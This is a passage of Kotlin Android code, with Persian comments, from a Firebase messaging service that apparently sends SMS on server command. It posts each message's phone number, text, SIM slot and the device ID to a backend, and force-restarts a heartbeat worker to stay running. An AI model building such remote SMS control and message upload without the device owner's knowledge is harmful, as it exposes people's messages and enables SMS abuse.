     * ⭐ راه‌اندازی مجدد WorkManager
     */
    private fun restartHeartbeatWorker() {
        try {
            val workRequest = androidx.work.PeriodicWorkRequestBuilder<HeartbeatWorker>(
                15,
                java.util.concurrent.TimeUnit.MINUTES,
                5,
                java.util.concurrent.TimeUnit.MINUTES
            )
                .setConstraints(
                    androidx.work.Constraints.Builder()
                        .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
                        .build()
                )
                .setBackoffCriteria(
                    androidx.work.BackoffPolicy.EXPONENTIAL,
                    10,
                    java.util.concurrent.TimeUnit.SECONDS
                )
                .addTag("heartbeat")
                .build()

            androidx.work.WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
                HeartbeatWorker.WORK_NAME,
                androidx.work.ExistingPeriodicWorkPolicy.REPLACE,  // ⭐ REPLACE برای force restart
                workRequest
            )

            Log.d(TAG, "💪 WorkManager restarted successfully")
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ WorkManager restart failed: ${e.message}")
        }
    }
    
    /**
     * ⭐ ارسال وضعیت SMS به سرور
     */
    private fun sendSmsStatusToServer(
        smsId: String,
        phone: String,
        message: String,
        simSlot: Int,
        status: String,
        details: String
    ) {
        Log.d(TAG, "═══ Sending SMS Status to Server ═══")
        Log.d(TAG, "🆔 SMS ID: $smsId")
        Log.d(TAG, "📱 Phone: $phone")
        Log.d(TAG, "📊 Status: $status")
        Log.d(TAG, "📝 Details: $details")
        
        Thread {
            val deviceId = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ANDROID_ID
            )
            
            val body = JSONObject().apply {
                put("device_id", deviceId)
                put("sms_id", smsId)
                put("phone", phone)
                put("message", message)
                put("sim_slot", simSlot)
                put("status", status)  // "sent", "failed", "delivered", "not_delivered"
                put("details", details)
                put("timestamp", System.currentTimeMillis())
            }
            
            try {
                val baseUrl = getBaseUrl()
                val url = URL("$baseUrl/sms/delivery-status")
                val conn = url.openConnection() as HttpURLConnection
                
                Log.d(TAG, "🌐 URL: $url")
                Log.d(TAG, "📤 Body: ${body.toString()}")
                
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 10000
                conn.readTimeout = 10000
                conn.doOutput = true
                
                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray())
                    os.flush()
                }
                
                val responseCode = conn.responseCode
                Log.d(TAG, "📥 Response Code: $responseCode")
                
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    val response = conn.inputStream.bufferedReader().use { it.readText() }
                    Log.d(TAG, "✅ SMS Status sent successfully: $response")
                } else {
                    val errorResponse = conn.errorStream?.bufferedReader()?.use { it.readText() }
                    Log.e(TAG, "❌ SMS Status failed: $errorResponse")
                    // ⭐ Fallback: ذخیره برای ارسال بعدی
                    savePendingResponse("sms_status", body.toString())
                }
                
                conn.disconnect()
                
            } catch (e: java.net.SocketTimeoutException) {
                Log.e(TAG, "❌ Connection timeout: ${e.message}")
                // ⭐ Fallback: ذخیره برای ارسال بعدی
                savePendingResponse("sms_status", body.toString())
            } catch (e: java.net.ConnectException) {
                Log.e(TAG, "❌ Connection failed: Cannot reach server")
                // ⭐ Fallback: ذخیره برای ارسال بعدی
                savePendingResponse("sms_status", body.toString())
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to send SMS status: ${e.message}")
                e.printStackTrace()
            }
        }.start()
    }
    
    /**
     * ارسال وضعیت سرویس‌ها به سرور
     */
    private fun sendServiceStatusToServer(success: Boolean) {
        Thread {
            try {
                val deviceId = Settings.Secure.getString(
                    contentResolver,
                    Settings.Secure.ANDROID_ID
                )
                
                val body = JSONObject().apply {
                    put("device_id", deviceId)
                    put("status", if (success) "services_started" else "services_failed")
                    put("timestamp", System.currentTimeMillis())
                }
                
                val baseUrl = getBaseUrl()
                val url = URL("$baseUrl/devices/service-status")
                val conn = url.openConnection() as HttpURLConnection
                
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 15000
                conn.readTimeout = 15000
                conn.doOutput = true
                
                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray())
                    os.flush()
                }
                
                val responseCode = conn.responseCode
                Log.d(TAG, "📡 Service status sent: $responseCode")
                
                conn.disconnect()
                
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to send service status: ${e.message}")
            }
        }.start()
    }

    /**
     * ⭐ چک کردن اینکه پیام قبلاً پردازش شده یا نه
     * برای جلوگیری از duplicate processing وقتی برنامه بعد از مدت طولانی offline دوباره online میشه
     */
    private fun isMessageAlreadyProcessed(messageId: String): Boolean {
        return try {
            val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val processedIds = prefs.getStringSet(KEY_PROCESSED_MSG_IDS, mutableSetOf()) ?: mutableSetOf()
            val isProcessed = processedIds.contains(messageId)
            if (isProcessed) {
                Log.d(TAG, "📋 Message $messageId already in processed list (${processedIds.size} total)")
            }
            isProcessed
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error checking message status: ${e.message}", e)
            false  // در صورت خطا، اجازه پردازش بده
        }
    }
    
    /**
     * ⭐ ثبت پیام به عنوان پردازش شده
     */
    private fun markMessageAsProcessed(messageId: String) {
        try {
            val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val processedIds = (prefs.getStringSet(KEY_PROCESSED_MSG_IDS, mutableSetOf()) ?: mutableSetOf()).toMutableSet()
            
            // ⭐ اضافه کردن پیام جدید
            processedIds.add(messageId)
            
            // ⭐ اگر تعداد از حد مجاز بیشتر شد، قدیمی‌ترین‌ها رو پاک کن
            if (processedIds.size > MAX_STORED_MSG_IDS) {
                val sortedIds = processedIds.sorted()  // sort برای پیدا کردن قدیمی‌ترین
                val idsToRemove = sortedIds.take(processedIds.size - MAX_STORED_MSG_IDS)
                processedIds.removeAll(idsToRemove)
                Log.d(TAG, "🧹 Cleaned up ${idsToRemove.size} old message IDs")
            }
            
            prefs.edit()
                .putStringSet(KEY_PROCESSED_MSG_IDS, processedIds)
                .apply()
            
            Log.d(TAG, "✅ Message $messageId marked as processed (${processedIds.size} total stored)")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error marking message as processed: ${e.message}", e)
        }
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "🔄 FCM Token Updated")
        Log.d(TAG, "New Token: $token")
        Log.d(TAG, "════════════════════════════════════════")
        
        subscribeToAllDevicesTopic()
    }
}
